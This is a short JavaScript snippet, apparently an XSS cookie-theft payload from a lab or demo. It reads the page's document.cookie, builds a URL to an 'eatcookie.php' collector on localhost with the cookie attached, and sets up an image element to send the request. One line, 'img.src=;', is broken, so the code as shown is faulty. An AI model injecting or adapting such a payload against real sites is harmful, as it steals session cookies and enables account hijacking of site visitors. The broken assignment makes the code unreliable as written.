var c=document.cookie;
//alert(c);
url="http://localhost/eatcookie.php?cookie="+escape(c);
var img=document.createElement('img');
img.src=;
document.body.appendChild(img);